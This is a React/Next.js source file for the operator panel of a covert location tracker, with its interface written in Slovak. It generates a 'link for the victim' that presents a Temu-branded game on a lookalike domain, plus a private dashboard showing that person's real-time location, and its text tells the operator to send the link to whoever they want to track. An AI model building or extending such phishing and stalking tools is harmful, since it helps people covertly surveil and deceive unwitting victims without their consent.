import { useState } from 'react';
import { v4 as uuidv4 } from 'uuid';
import { createTrackingLink } from '../lib/trackingLink';
import { Copy, ExternalLink, ShieldCheck, MapPin, Eye, Mail } from 'lucide-react';
import Head from 'next/head';

export default function HomePage() {
  const [trackingLink, setTrackingLink] = useState('');
  const [targetEmail, setTargetEmail] = useState('');
  const [isGenerating, setIsGenerating] = useState(false);
  const [errorText, setErrorText] = useState('');
  const [copyStatus, setCopyStatus] = useState({ victim: false, viewer: false });

  const handleGenerate = async (e) => {
    e?.preventDefault();
    if (!targetEmail.includes('@')) {
      setErrorText('Zadajte platnú e-mailovú adresu.');
      return;
    }
    setErrorText('');
    setIsGenerating(true);

    try {
      const token = uuidv4();
      const origin = typeof window !== 'undefined' ? window.location.origin : 'https://temu.pop-mart.cloud';

      const res = await fetch('/api/session/init', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ token, email: targetEmail })
      });

      if (!res.ok) {
        throw new Error('Nepodarilo sa vytvoriť reláciu');
      }

      setTrackingLink(createTrackingLink(origin, token));
    } catch (err) {
      setErrorText('Chyba servera pri vytváraní linku.');
      console.error(err);
    } finally {
      setIsGenerating(false);
    }
  };

  const copyToClipboard = async (text, type) => {
    try {
      await navigator.clipboard.writeText(text);
      setCopyStatus({ ...copyStatus, [type]: true });
      setTimeout(() => setCopyStatus({ ...copyStatus, [type]: false }), 2000);
    } catch (err) {
      console.error('Failed to copy!', err);
    }
  };

  const resetForm = () => {
    setTrackingLink('');
    setTargetEmail('');
    setErrorText('');
  };

  const viewerLink = trackingLink ? `${trackingLink}&view=1` : '';

  return (
    <div className="min-h-screen bg-[#0f172a] text-white selection:bg-orange-500/30">
      <Head>
        <title>Temu Tracker Admin | Panel</title>
        <meta name="viewport" content="width=device-width, initial-scale=1" />
      </Head>

      <style jsx global>{`
        @import url('https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600;700&display=swap');
        body { font-family: 'Outfit', sans-serif; background: #0f172a; margin: 0; }
        .glass-card {
          background: rgba(30, 41, 59, 0.7);
          backdrop-filter: blur(12px);
          border: 1px solid rgba(255, 255, 255, 0.1);
          border-radius: 24px;
        }
        .animate-fade-in {
          animation: fadeIn 0.8s ease-out forwards;
        }
        @keyframes fadeIn {
          from { opacity: 0; transform: translateY(20px); }
          to { opacity: 1; transform: translateY(0); }
        }
        .button-primary {
          background: linear-gradient(135deg, #fd3c1c 0%, #ff6b3d 100%);
          transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
        }
        .button-primary:hover {
          transform: translateY(-2px);
          box-shadow: 0 10px 20px -10px rgba(253, 60, 28, 0.5);
        }
        .button-secondary {
          background: rgba(255, 255, 255, 0.05);
          border: 1px solid rgba(255, 255, 255, 0.1);
          transition: all 0.2s;
        }
        .button-secondary:hover {
          background: rgba(255, 255, 255, 0.1);
        }
      `}</style>

      <main className="max-w-4xl mx-auto px-6 py-12 md:py-24 animate-fade-in">
        <header className="text-center mb-16">
          <div className="inline-flex items-center gap-2 bg-orange-500/10 text-orange-500 px-4 py-2 rounded-full text-sm font-semibold mb-6 border border-orange-500/20">
            <ShieldCheck size={16} />
            <span>Secure Verification Analytics</span>
          </div>
          <h1 className="text-5xl md:text-6xl font-bold mb-6 tracking-tight">
            Tracker <span className="text-orange-500">Generator</span>
          </h1>
          <p className="text-slate-400 text-lg md:text-xl max-w-2xl mx-auto leading-relaxed">
            Generujte bezpečné odkazy pre overenie polohy. Systém presmeruje obeť na Temu hernú kampaň.
          </p>
        </header>

        {!trackingLink ? (
          <form onSubmit={handleGenerate} className="glass-card p-8 max-w-md mx-auto relative overflow-hidden group">
            <div className="absolute inset-0 bg-gradient-to-br from-orange-500/10 to-red-500/10 opacity-0 group-hover:opacity-100 transition-opacity"></div>
            <div className="relative">
              <div className="flex items-center gap-3 mb-4">
                <div className="p-2 bg-orange-500/10 text-orange-500 rounded-lg">
                  <Mail size={20} />
                </div>
                <h3 className="text-xl font-bold">Nastavenie relácie</h3>
              </div>
              <p className="text-slate-400 text-sm mb-6">Zadajte e-mail, na ktorý chcete dostať upozornenie s presnou polohou užívateľa.</p>

              <div className="mb-6">
                <label className="block text-xs font-bold text-slate-400 uppercase tracking-wider mb-2">Cieľový E-mail</label>
                <input
                  type="email"
                  value={targetEmail}
                  onChange={(e) => setTargetEmail(e.target.value)}
                  placeholder="napr. sef@firma.sk"
                  className="w-full bg-slate-900/50 border border-white/10 rounded-xl px-4 py-3 text-white placeholder-slate-500 focus:outline-none focus:border-orange-500 focus:ring-1 focus:ring-orange-500 transition-all font-mono text-sm"
                  required
                />
              </div>

              {errorText && <p className="text-red-400 text-sm mb-4 font-semibold">{errorText}</p>}

              <button
                type="submit"
                disabled={isGenerating}
                className="w-full button-primary py-4 rounded-xl flex items-center justify-center gap-2 font-bold transition-all disabled:opacity-70 disabled:cursor-not-allowed"
              >
                {isGenerating ? (
                  <span className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin"></span>
                ) : (
                  <>Vygenerovať bezpečný odkaz</>
                )}
              </button>
            </div>
          </form>
        ) : (
          <div className="grid gap-8 md:grid-cols-2">
            {/* Victim Section */}
            <div className="glass-card p-8 flex flex-col justify-between group">
              <div>
                <div className="flex items-center gap-3 mb-6">
                  <div className="p-3 bg-red-500/10 text-red-500 rounded-xl">
                    <MapPin size={24} />
                  </div>
                  <h3 className="text-xl font-bold">1. Link pre Obeť</h3>
                </div>
                <p className="text-slate-400 text-sm mb-4 leading-relaxed">
                  Tento odkaz pošli osobe, ktorú chceš sledovať. Po otvorení sa jej zobrazí Temu hra.
                </p>
                <div className="bg-slate-900/50 p-4 rounded-xl font-mono text-xs border border-white/5 break-all mb-6 text-orange-400">
                  {trackingLink}
                </div>
              </div>
              <button
                onClick={() => copyToClipboard(trackingLink, 'victim')}
                className={`w-full py-4 rounded-xl flex items-center justify-center gap-2 font-bold transition-all ${copyStatus.victim ? 'bg-green-500 text-white' : 'button-primary text-white'
                  }`}
              >
                {copyStatus.victim ? (
                  <>OK! Skopírované</>
                ) : (
                  <>
                    <Copy size={20} />
                    <span>Kopírovať Link</span>
                  </>
                )}
              </button>
            </div>

            {/* Viewer Section */}
            <div className="glass-card p-8 border-emerald-500/20 flex flex-col justify-between grayscale-[0.5] hover:grayscale-0 transition-all">
              <div>
                <div className="flex items-center gap-3 mb-6">
                  <div className="p-3 bg-emerald-500/10 text-emerald-500 rounded-xl">
                    <Eye size={24} />
                  </div>
                  <h3 className="text-xl font-bold">2. Tvoj Dashboard</h3>
                </div>
                <p className="text-slate-400 text-sm mb-4 leading-relaxed">
                  Tento odkaz si ulož. Uvidíš mapu v reálnom čase.<br />
                  <span className="text-emerald-400/80">Notifikácie prídu na: <b>{targetEmail}</b></span>
                </p>
                <div className="bg-slate-900/50 p-4 rounded-xl font-mono text-xs border border-white/5 break-all mb-6 text-emerald-400">
                  {viewerLink}
                </div>
              </div>
              <div className="flex gap-3">
                <button
                  onClick={() => copyToClipboard(viewerLink, 'viewer')}
                  className={`flex-1 py-4 rounded-xl flex items-center justify-center gap-2 font-bold transition-all ${copyStatus.viewer ? 'bg-green-500 text-white' : 'button-secondary text-slate-300'
                    }`}
                >
                  <Copy size={18} />
                  <span>Kopírovať Info</span>
                </button>
                <a
                  href={viewerLink}
                  target="_blank"
                  rel="noopener noreferrer"
                  className="p-4 rounded-xl bg-slate-800 text-white hover:bg-slate-700 transition-colors flex items-center justify-center"
                >
                  <ExternalLink size={20} />
                </a>
              </div>
            </div>
          </div>
        )}

        {trackingLink && (
          <footer className="mt-24 pt-8 border-t border-white/5 text-center">
            <button
              onClick={resetForm}
              className="text-slate-500 hover:text-white text-sm transition-colors flex items-center gap-2 mx-auto"
            >
              Vytvoriť novú reláciu (Nový e-mail a kód)
            </button>
          </footer>
        )}
      </main>
    </div>
  );
}
